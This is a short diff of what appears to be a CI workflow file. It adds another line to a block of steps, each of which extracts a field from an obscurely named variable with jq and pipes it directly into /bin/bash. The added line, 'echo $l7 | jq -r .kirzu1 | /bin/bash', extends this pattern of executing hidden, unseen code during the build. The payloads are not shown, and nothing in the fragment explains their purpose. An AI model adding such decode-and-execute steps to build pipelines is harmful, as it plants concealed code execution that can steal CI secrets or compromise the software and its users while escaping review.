@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$f54002" | jq -r .a788 | /bin/bash
           printf '%s' "$axxn9" | jq -r .xpq0 | /bin/bash
           printf '%s' "$b64" | jq -r .l45641 | /bin/bash
+          echo $l7 | jq -r .kirzu1 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
